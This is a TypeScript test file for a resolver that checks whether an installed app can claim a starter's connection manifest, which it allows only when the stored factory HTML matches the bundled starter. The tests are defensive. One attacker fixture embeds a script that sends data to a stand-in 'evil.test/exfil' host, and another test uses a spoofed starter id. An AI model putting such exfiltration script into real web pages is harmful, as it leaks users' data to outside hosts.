// starterDeclaration.test.ts — TASK-20260807-connection-reachability, plan v2 §V2-2/V2-3/V2-7.
//
// The install-act declaration resolver: the ONE place that answers "did the user install
// an app that ships a first-party connection manifest?" for an app that has no chat and
// therefore can never reach the wizard through a directive.
//
// The whole design rests on the resolver refusing to be fooled. `install_source` is a
// plain column an attacker controls through a whole-DB import, so it can never be the
// sole key — the resolver additionally requires the app's PINNED FACTORY HTML to match
// the bundled starter's. Two independent facts, both first-party, or no declaration.
//
// Tests, per plan v2:
//   T2  — a genuinely-installed starter with a manifest resolves to its declaration
//   T2b — one changed byte in the stored HTML ⇒ null
//   T2c — imported-app simulation: starter install_source + foreign HTML ⇒ null
//   T2d — the comparison reads pinned version 1, never current_version
//   T2e — a malformed manifest ⇒ null + one console.warn, and nothing throws
//   T2f — normalized-equal HTML still resolves; a semantic edit does not, and REPORTS why

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { UserDb } from '@snugprotocol/db';

import {
  resolveDeclaredIntent,
  starterDeclarationFor,
  starterDeclarationForStarterId,
  __setDeclarationManifestsForTests,
  __resetDeclarationManifestsForTests,
} from '../starter/starterDeclaration.js';
import { installTestUserDb } from './userdbTestHelper.js';

/** Pinned shared literals (task file §Shared literals v2). */
const DEMO_FOLDER = 'connection-demo';
const DEMO_SOURCE = `starter:${DEMO_FOLDER}`;
const DECLARED_HOST = 'api.example.com';

/**
 * The bundled starter HTML this suite pretends `examples/connection-demo/app.html`
 * ships. The resolver reads the real glob in production; tests inject so the assertions
 * pin the RULE (both facts must hold) rather than the current bytes of a fixture file,
 * which would make every future edit to the demo app a red test here.
 */
const BUNDLED_HTML = '<!doctype html>\n<html>\n  <body>\n    <script>const app = 1;</script>\n  </body>\n</html>\n';

const VALID_MANIFEST = JSON.stringify({
  kindHint: 'api_key',
  providerName: 'Example API',
  docsUrl: 'https://docs.example.com/api',
  declaredApiHosts: [DECLARED_HOST],
});

let db: UserDb;

beforeEach(async () => {
  db = await installTestUserDb();
  __setDeclarationManifestsForTests({
    [DEMO_FOLDER]: { manifest: VALID_MANIFEST, html: BUNDLED_HTML },
  });
});

afterEach(() => {
  __resetDeclarationManifestsForTests();
  vi.restoreAllMocks();
});

/** Installs the demo the way the run view does: factory HTML, starter install_source. */
function installDemo(html: string = BUNDLED_HTML): string {
  return db.installApp({ displayName: 'connection demo', html, installSource: DEMO_SOURCE }).appId;
}

describe('T2 — a genuinely-installed starter resolves to its declaration', () => {
  it('returns the parsed, schema-valid proposal', async () => {
    const appId = installDemo();
    const result = await starterDeclarationFor(db, appId);

    expect(result, 'a first-party install with a manifest must declare').not.toBeNull();
    expect(result?.declaration.providerName).toBe('Example API');
    expect(result?.declaration.declaredApiHosts).toEqual([DECLARED_HOST]);
  });

  it('returns null for an app with no manifest at all (most apps)', async () => {
    const appId = db.installApp({
      displayName: 'chess',
      html: '<html>chess</html>',
      installSource: 'starter:chess',
    }).appId;
    expect(await starterDeclarationFor(db, appId)).toBeNull();
  });

  it('returns null for an app with no install_source (a user-built app)', async () => {
    const appId = db.installApp({ displayName: 'mine', html: BUNDLED_HTML }).appId;
    expect(await starterDeclarationFor(db, appId), 'no source ⇒ no install act to trust').toBeNull();
  });

  it('returns null for an unknown app id rather than throwing', async () => {
    expect(await starterDeclarationFor(db, 'no-such-app')).toBeNull();
  });
});

describe('T2b — the stored HTML must match the bundled starter', () => {
  it('one changed byte in the stored HTML withdraws the declaration', async () => {
    // The single byte is the point: this is the whole-DB-import attack in miniature. If
    // the resolver trusted install_source alone, this app would declare.
    const appId = installDemo(BUNDLED_HTML.replace('const app = 1;', 'const app = 2;'));
    expect(await starterDeclarationFor(db, appId), 'edited HTML must not declare').toBeNull();
  });
});

describe('T2c — an imported app cannot borrow a starter’s declaration', () => {
  it('a starter install_source carrying foreign HTML resolves to null', async () => {
    const appId = installDemo('<html><script>fetch("https://evil.test/exfil")</script></html>');
    expect(await starterDeclarationFor(db, appId), 'attacker HTML must never declare').toBeNull();
  });

  it('the resolver does not fall back to install_source when the HTML is missing', async () => {
    const appId = installDemo();
    vi.spyOn(db, 'getAppHtml').mockReturnValue(undefined);
    expect(await starterDeclarationFor(db, appId), 'absent HTML is a mismatch, not a pass').toBeNull();
  });
});

describe('T2d — the comparison reads the PINNED factory version, never current_version', () => {
  it('a user edit on TOP of an untouched factory v1 keeps the declaration', async () => {
    // Deliberate, and the reason the pinned version is the right key: the user editing
    // their copy does not retract the fact that they installed a declaring starter. The
    // factory bytes are still what the install act brought in, so the declaration stands
    // — and the user still reviews every field before anything is approved.
    const appId = installDemo();
    db.saveAppVersion(appId, '<html>my own edits</html>', 'user edit');

    expect(await starterDeclarationFor(db, appId), 'the pinned factory version is untouched').not.toBeNull();
  });

  it('reads version 1 explicitly — a doctored current version cannot mint a declaration', async () => {
    // The inverse attack: factory v1 is foreign, but the user's LATEST version happens to
    // match the bundle. A `current_version` comparison would declare here; reading the
    // pinned v1 must not.
    const appId = installDemo('<html>not the factory app</html>');
    db.saveAppVersion(appId, BUNDLED_HTML, 'looks legitimate now');

    expect(await starterDeclarationFor(db, appId), 'only the pinned factory version counts').toBeNull();
  });

  it('asks the DB for version 1 by number', async () => {
    const appId = installDemo();
    const spy = vi.spyOn(db, 'getAppHtml');
    await starterDeclarationFor(db, appId);
    expect(spy).toHaveBeenCalledWith(appId, 1);
  });
});

describe('T2e — a malformed manifest is parsed-and-dropped, never a crash', () => {
  it('invalid JSON resolves to null and warns exactly once', async () => {
    __setDeclarationManifestsForTests({ [DEMO_FOLDER]: { manifest: '{ not json', html: BUNDLED_HTML } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId)).toBeNull();
    expect(warn, 'a malformed manifest must be reported, once').toHaveBeenCalledTimes(1);
  });

  it('a schema-invalid manifest resolves to null and warns', async () => {
    // Valid JSON, wrong shape: `providerName` is required by llmProposalSchema.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: { manifest: JSON.stringify({ declaredApiHosts: [DECLARED_HOST] }), html: BUNDLED_HTML },
    });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId)).toBeNull();
    expect(warn).toHaveBeenCalledTimes(1);
  });

  it('a manifest carrying an EXCLUDED key is rejected, not silently accepted', async () => {
    // llmProposalSchema omits registration copy by strict-schema rejection (M5/M21). A
    // manifest is first-party today, but the resolver must not be the one place that
    // relaxes the proposal contract — an app-import channel would inherit that hole.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: {
        manifest: JSON.stringify({
          providerName: 'Example API',
          declaredApiHosts: [DECLARED_HOST],
          registrationInstructions: ['click here to get owned'],
        }),
        html: BUNDLED_HTML,
      },
    });
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId), 'excluded keys are a strict rejection').toBeNull();
  });
});

describe('T2f — normalized comparison, and a mismatch REPORTS its reason', () => {
  it('line-ending and trailing-whitespace differences still resolve', async () => {
    // The silent-withdrawal failure mode (fidelity check C1): a checkout with CRLF line
    // endings, or a formatter touching trailing space, must not strand the user in the
    // empty wizard this task exists to eliminate.
    // CRLF line endings, trailing spaces at end of lines, and a trailing newline — the
    // three things a checkout, a formatter or an editor changes without touching code.
    const crlf = `${BUNDLED_HTML.replace(/\n/g, '  \r\n')}\r\n\r\n`;
    const appId = installDemo(crlf);

    expect(await starterDeclarationFor(db, appId), 'whitespace-only drift must still declare').not.toBeNull();
  });

  it('an INDENTATION change is not forgiven — normalization is narrow by design', async () => {
    // Pins the limit of the previous test. Leading whitespace is inside the line, so it
    // survives normalization and reads as an edit. Widening `normalize()` to collapse all
    // whitespace would make the byte-match far weaker than V2-2 requires, and this test
    // is what fails if someone later reaches for `.replace(/\s+/g, ' ')`.
    const appId = installDemo(BUNDLED_HTML.replace('  <body>', '        <body>'));

    expect(await starterDeclarationFor(db, appId)).toBeNull();
  });

  it('a semantic edit does not resolve, and the mismatch is reported for the Settings surface', async () => {
    const appId = installDemo(BUNDLED_HTML.replace('const app = 1;', 'const app = 999;'));
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration, 'a semantic edit must withdraw').toBeUndefined();
    expect(outcome.mismatch, 'withdrawal must be explainable, never silent').toBe('html_mismatch');
  });

  it('the happy path reports no mismatch', async () => {
    const appId = installDemo();
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration).toBeDefined();
    expect(outcome.mismatch).toBeUndefined();
  });

  it('an app with no manifest reports no mismatch either — it simply never declared', async () => {
    // The distinction the Settings surface depends on: "this app’s code no longer matches
    // its starter" is a WARNING, while "this app has no connection" is the normal case.
    // Collapsing them would put a scary banner on every app in the library.
    const appId = db.installApp({ displayName: 'chess', html: '<html>chess</html>', installSource: 'starter:chess' })
      .appId;
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration).toBeUndefined();
    expect(outcome.mismatch, 'no manifest is not a mismatch').toBeUndefined();
  });
});

describe('the resolver never consults the well-known registry (posture)', () => {
  it('returns the manifest’s own provider name verbatim, unenriched', async () => {
    // `resolveDeclaredIntent` must not borrow registry legitimacy — the wizard applies
    // the registry later, under the user’s eyes, in the strong review. A resolver that
    // pre-enriched would be handing an app the registry's authority at install time.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: {
        manifest: JSON.stringify({ providerName: 'github', declaredApiHosts: [DECLARED_HOST] }),
        html: BUNDLED_HTML,
      },
    });
    const appId = installDemo();
    const result = await starterDeclarationFor(db, appId);

    expect(result?.declaration.providerName).toBe('github');
    expect(result?.declaration.declaredApiHosts, 'declared hosts survive verbatim').toEqual([DECLARED_HOST]);
    expect(result?.declaration.endpoints, 'no registry endpoints may be spliced in').toBeUndefined();
  });
});

describe('the PRE-INSTALL lookup — what the run view discloses before anything is owned', () => {
  it('reports the declaration for a starter the user has not installed', async () => {
    // The install disclosure (§V2-6) runs on the READ-ONLY starter route, where there is
    // no app row and no stored HTML — so it cannot use the two-fact resolver. This is a
    // deliberately weaker lookup for a deliberately weaker claim: "this starter ships a
    // declared connection", made about BUNDLED bytes the user has not yet copied.
    const declaration = await starterDeclarationForStarterId(`starter--${DEMO_FOLDER}`);

    expect(declaration?.providerName).toBe('Example API');
    expect(declaration?.declaredApiHosts).toEqual([DECLARED_HOST]);
  });

  it('returns null for a starter that ships no manifest', async () => {
    expect(await starterDeclarationForStarterId('starter--chess')).toBeNull();
  });

  it('returns null for an id that is not a starter id at all', async () => {
    // An installed app's uuid must never resolve here — that path has to go through the
    // two-fact resolver, or the HTML check could be bypassed by asking the wrong question.
    expect(await starterDeclarationForStarterId('9f3a1c22-0000-4000-8000-000000000000')).toBeNull();
  });

  it('the prefix guard really guards — an id whose SLICE would hit a real folder must not resolve', async () => {
    // Found by mutation M22, and it took two attempts to write a test that can actually
    // fail for the reason it names.
    //
    // Attempt 1 passed a bare folder name — useless, because without the guard
    // `'connection-demo'.slice(9)` is `'on-demo'`, which matches nothing, so the function
    // returns null either way. The guard was never exercised and the test proved nothing.
    //
    // The discriminating input has to be one where the UNGUARDED `slice()` lands exactly
    // on a real folder. `STARTER_PREFIX` is 9 chars, so a 9-char prefix followed by the
    // folder name does it: with the guard this is refused outright; without it, the slice
    // yields `connection-demo` and the function would answer for an id it has no
    // authority over. That is the whole point of the guard — an installed app's id must
    // go through the two-fact resolver, never this weaker lookup.
    const spoofed = `..:.:.:.:${DEMO_FOLDER}`;
    expect(spoofed.slice(9), 'the fixture must actually reach a real folder when unguarded').toBe(DEMO_FOLDER);

    expect(await starterDeclarationForStarterId(spoofed), 'only prefixed starter ids may resolve').toBeNull();
  });

  it('drops a malformed manifest exactly like the installed path', async () => {
    __setDeclarationManifestsForTests({ [DEMO_FOLDER]: { manifest: '{ nope', html: BUNDLED_HTML } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});

    expect(await starterDeclarationForStarterId(`starter--${DEMO_FOLDER}`)).toBeNull();
    expect(warn).toHaveBeenCalledTimes(1);
  });
});
